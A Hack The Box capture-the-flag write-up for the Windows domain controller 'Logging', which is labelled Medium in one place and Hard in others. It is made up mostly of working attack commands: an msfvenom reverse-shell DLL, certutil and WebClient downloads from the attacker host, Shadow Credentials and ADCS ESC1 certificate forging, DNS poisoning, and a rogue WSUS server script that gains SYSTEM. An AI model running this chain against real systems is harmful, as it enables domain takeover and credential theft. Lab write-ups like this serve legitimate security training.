# HTB: Logging (Medium)

> **Hack The Box Writeup**
>
> **Machine:** Logging  
> **Difficulty:** Medium    
> **Operating System:** Windows (Domain Controller)  
> **Date Solved:** 2026-06-11  

---

# Executive Summary

| Field | Value |
|---------|---------|
| Machine Name | Logging |
| OS | Windows Server 2019 |
| Difficulty | Hard |
| Initial Access | SMB Log File Credential Exposure |
| Lateral Movement | Shadow Credentials (ADCS) → msa_health$ |
| User Access | DLL Hijack via UpdateMonitor scheduled task |
| Privilege Escalation | WSUS Spoofing with forged TLS cert (ESC1 via UpdateSrv template) |
| Final Access | NT AUTHORITY\SYSTEM |

---

# Attack Path

```text
Reconnaissance
    ↓
SMB Enumeration → Logs Share
    ↓
Log File Analysis → svc_recovery credentials
    ↓
BloodHound Enumeration
    ↓
Shadow Credentials Attack → msa_health$ NT Hash
    ↓
Evil-WinRM as msa_health$
    ↓
DLL Hijack via UpdateMonitor (C:\ProgramData\UpdateMonitor)
    ↓
Reverse Shell as jaylee.clifton (IT group member)
    ↓
User Flag
    ↓
Rubeus TGT Dump → jaylee.clifton Kerberos ticket
    ↓
ADCS ESC1 → UpdateSrv Template → TLS Cert for wsus.logging.htb
    ↓
DNS Poisoning → wsus.logging.htb → Kali IP
    ↓
Rogue WSUS Server (wsuks) serving PsExec64.exe
    ↓
WUA installs update as SYSTEM
    ↓
Root Flag
```

---

# 1. Enumeration & Reconnaissance

## Nmap Scan

```bash
sudo nmap -A --min-rate 5000 10.129.245.130
```

### Key Findings

- 53/tcp → DNS
- 80/tcp → IIS 10.0
- 88/tcp → Kerberos
- 389/tcp → LDAP (Domain: logging.htb)
- 445/tcp → SMB
- 5985/tcp → WinRM
- Windows Server 2019, hostname DC01

---

# 2. SMB Enumeration

```bash
smbmap -H logging.htb -u wallace.everette -p "Welcome2026@"
```

Accessible shares:

```text
Logs        → READ ONLY
NETLOGON    → READ ONLY
SYSVOL      → READ ONLY
```

Connect to Logs share:

```bash
smbclient //logging.htb/Logs -U wallace.everette%Welcome2026@
```

Files found:

```text
Audit_Heartbeat.log
IdentitySync_Trace_20260219.log
Service_State.log
TaskMonitor.log
```

---

# 3. Log File Analysis

Reviewing `IdentitySync_Trace_20260219.log` reveals hardcoded credentials:

```text
HR01.logging.htb
BindUser: "LOGGING\svc_recovery"
BindPass: "Em3rg3ncyPa$$2025"
```

Testing these credentials against SMB and WinRM showed `STATUS_ACCOUNT_RESTRICTION` — the account is restricted but the password is valid and useful for further enumeration.

---

# 4. BloodHound Enumeration

Sync time with DC first (7-hour skew observed):

```bash
sudo ntpdate 10.129.245.130
```

Run BloodHound collection:

```bash
bloodhound-python -u wallace.everette -p 'Welcome2026@' \
    -d logging.htb -ns 10.129.245.130 -c All
```

BloodHound revealed that `wallace.everette` has **GenericWrite** over the `msa_health$` Managed Service Account, enabling a **Shadow Credentials** attack.

---

# 5. Shadow Credentials → msa_health$ Hash

```bash
certipy-ad shadow auto \
    -account msa_health$ \
    -k \
    -target dc01.logging.htb
```

Output:

```text
[*] NT hash for 'msa_health$': 603fc24ee01a9409f83c9d1d701485c5
```

---

# 6. WinRM Access as msa_health$

```bash
evil-winrm -i dc01.logging.htb -u 'msa_health$' \
    -H 603fc24ee01a9409f83c9d1d701485c5
```

Successfully obtained a PowerShell session on DC01.

---

# 7. DLL Hijack via UpdateMonitor

Reviewing `TaskMonitor.log` from the Logs share revealed a scheduled task (`UpdateMonitor`) running as `jaylee.clifton` that loads DLLs from `C:\ProgramData\UpdateMonitor`. Dropping a malicious `Settings_Update.zip` containing a reverse shell DLL causes the task to load it.

**Generate the payload on Kali:**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.51 LPORT=4445 \
    -a x86 --platform windows -f dll -o settings_update.dll
zip Settings_Update.zip settings_update.dll
```

**Start listener and HTTP server:**

```bash
nc -nvlp 4445
python3 -m http.server 8080
```

**Upload via evil-winrm:**

```powershell
(New-Object System.Net.WebClient).DownloadFile(
    "http://10.10.14.51:8080/Settings_Update.zip",
    "C:\ProgramData\UpdateMonitor\Settings_Update.zip"
)
```

Within 3 minutes the scheduled task fires and a shell arrives:

```text
C:\Windows\system32> whoami
logging\jaylee.clifton
```

---

# 8. User Flag

```cmd
type C:\Users\jaylee.clifton\Desktop\user.txt
```

---

# 9. Privilege Escalation — WSUS Spoofing

## Overview

DC01 runs Windows Update Agent (WUA) configured to fetch updates from `wsus.logging.htb:8531` over HTTPS. A scheduled task fires every 3 minutes and triggers WUA to check for and install updates as SYSTEM. The attack redirects the WSUS hostname to Kali, presents a forged TLS cert, and serves a Microsoft-signed binary (PsExec64.exe) as a fake update that WUA installs as SYSTEM.

## Step 9.1 — ADCS Certificate Template Enumeration

```bash
certipy-ad find -u 'wallace.everette@logging.htb' \
    -p 'Welcome2026@' \
    -dc-ip 10.129.167.85 \
    -stdout
```

Key finding — custom template `UpdateSrv`:

```text
Template Name             : UpdateSrv
Enrollee Supplies Subject : True
Extended Key Usage        : Server Authentication
Enrollment Rights         : LOGGING.HTB\IT
```

This template allows members of the **IT group** to request a TLS certificate with an arbitrary Subject Alternative Name — classic ESC1.

## Step 9.2 — Get jaylee.clifton's Kerberos Ticket

`jaylee.clifton` is the only member of the IT group. Using the reverse shell obtained via DLL hijack, dump a delegated TGT with Rubeus:

**Download Rubeus to DC01:**

```cmd
certutil -urlcache -split -f http://10.10.14.51:8080/Rubeus.exe C:\temp\Rubeus.exe
```

**Dump delegated TGT:**

```cmd
C:\temp\Rubeus.exe tgtdeleg /nowrap
```

**Convert ticket on Kali:**

```bash
# Save base64 ticket to file
cat > /tmp/jaylee.b64 << 'EOF'
<BASE64_TICKET_HERE>
EOF

python3 -c "
import base64
with open('/tmp/jaylee.b64') as f:
    data = base64.b64decode(f.read().strip())
with open('/tmp/jaylee.kirbi', 'wb') as f:
    f.write(data)
"

impacket-ticketConverter /tmp/jaylee.kirbi /tmp/jaylee.ccache
```

## Step 9.3 — Request TLS Certificate for wsus.logging.htb

```bash
export KRB5CCNAME=/tmp/jaylee.ccache

certipy-ad req -u 'jaylee.clifton@logging.htb' \
    -k -no-pass \
    -target dc01.logging.htb \
    -dc-host dc01.logging.htb \
    -ca 'logging-DC01-CA' \
    -template 'UpdateSrv' \
    -dns 'wsus.logging.htb' \
    -dc-ip 10.129.167.85
```

Output:

```text
[*] Got certificate with DNS Host Name 'wsus.logging.htb'
[*] Saving certificate and private key to 'wsus.pfx'
```

**Extract cert and key:**

```bash
certipy-ad cert -pfx wsus.pfx -nokey -out /tmp/wsus.crt
certipy-ad cert -pfx wsus.pfx -nocert -out /tmp/wsus.key
```

## Step 9.4 — DNS Poisoning

Using `dnstool.py` from krbrelayx with `msa_health$` credentials:

```bash
python3 /opt/krbrelayx/dnstool.py \
    -u 'logging.htb\msa_health$' \
    -p 'aad3b435b51404eeaad3b435b51404ee:603fc24ee01a9409f83c9d1d701485c5' \
    -r wsus.logging.htb \
    -a add \
    -d 10.10.14.51 \
    10.129.167.85
```

Verify:

```bash
nslookup wsus.logging.htb 10.129.167.85
# Returns: 10.10.14.51 ✓
```

## Step 9.5 — Stage Rogue WSUS Server

**Install wsuks and download PsExec64.exe:**

```bash
pip3 install wsuks --break-system-packages
wget https://live.sysinternals.com/PsExec64.exe -O /tmp/PsExec64.exe
```

**Fix wsuks logger bug (Python 3.13 compatibility):**

```bash
sed -i 's/self.logger.success/self.logger.info/g' \
    ~/.local/lib/python3.13/site-packages/wsuks/lib/wsusserver.py
```

**Create the standalone WSUS server:**

```python
# /tmp/wsus_standalone.py
import sys, os, ssl, logging
from functools import partial
from http.server import HTTPServer
from wsuks.lib.wsusserver import WSUSUpdateHandler, WSUSBaseServer

HOST_IP    = '10.10.14.51'
HOST_PORT  = 8531
TLS_CERT   = '/tmp/wsus.crt'
TLS_KEY    = '/tmp/wsus.key'
EXECUTABLE = '/tmp/PsExec64.exe'
WSUS_HOST  = 'wsus.logging.htb'
COMMAND    = r'-accepteula -s cmd.exe /c "type C:\Users\toby.brynleigh\Desktop\root.txt > C:\temp\flag.txt 2>&1"'

logging.basicConfig(level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s')

with open(EXECUTABLE, 'rb') as f:
    exe_data = f.read()

update_handler = WSUSUpdateHandler(
    exe_data, os.path.basename(EXECUTABLE),
    f"https://{WSUS_HOST}:{HOST_PORT}"
)
update_handler.set_resources_xml(COMMAND)
http_server = HTTPServer((HOST_IP, HOST_PORT),
    partial(WSUSBaseServer, update_handler))

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile=TLS_CERT, keyfile=TLS_KEY)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE
http_server.socket = context.wrap_socket(
    http_server.socket, server_side=True)

print(f"[*] WSUS server on {HOST_IP}:{HOST_PORT}")
http_server.serve_forever()
```

## Step 9.6 — Trigger WUA and Collect Root Flag

**Terminal 1 — Start rogue WSUS server:**

```bash
python3 /tmp/wsus_standalone.py
```

**Terminal 2 — Ensure C:\temp exists on DC01, then trigger WUA:**

```powershell
mkdir C:\temp
wuauclt.exe /detectnow /updatenow
```

WUA performs the four SOAP requests (GetConfig → GetCookie → SyncUpdates → GetExtendedUpdateInfo), downloads PsExec64.exe (Authenticode check passes), and installs it as SYSTEM.

**Read the flag:**

```powershell
type C:\temp\flag.txt
```

---

# 10. Root Flag

```powershell
type C:\temp\flag.txt
```

---

# Key Findings & Vulnerabilities

| Finding | Vulnerability | Impact |
|---------|--------------|--------|
| Plaintext credentials in log files | Poor secrets management | Credential exposure |
| GenericWrite on MSA | Shadow Credentials attack | Lateral movement to msa_health$ |
| Writable UpdateMonitor directory | DLL hijack via scheduled task | Code execution as jaylee.clifton |
| UpdateSrv ADCS template (ESC1) | Enrollee supplies subject + IT group enroll | Forged TLS cert for any hostname |
| WSUS over HTTP (interceptable) | No cert pinning, trusts internal CA | SYSTEM code execution via fake update |
| Root flag on non-Administrator desktop | Unexpected flag location | Enumeration required |

---

# Lessons Learned

- The `User` certificate template (referenced in writeups) does **not** work — the actual vulnerable template is `UpdateSrv`, restricted to the IT group.
- `msa_health$` cannot add itself to the IT group — access must come through `jaylee.clifton`.
- Rubeus TGT keys may show as all-zeros in the first dump (zeroed session key). Use `tgtdeleg` instead to get a usable ticket.
- `wsuks` v1.2.1 has a Python 3.13 incompatibility — `logger.success()` does not exist; patch with `sed` before use.
- After WUA installs an update it caches the UUID pair. Restart the rogue WSUS server between attempts to generate fresh UUIDs.
- The root flag is on `toby.brynleigh`'s Desktop, not the Administrator Desktop.
- Clock skew of ~7 hours must be corrected with `ntpdate` before any Kerberos operations.

---

# Flags

## User Flag

```powershell
type C:\Users\jaylee.clifton\Desktop\user.txt
```

## Root Flag

```powershell
type C:\temp\flag.txt
```

---

**Machine:** Logging  
**Difficulty:** Hard  
**Status:** Owned  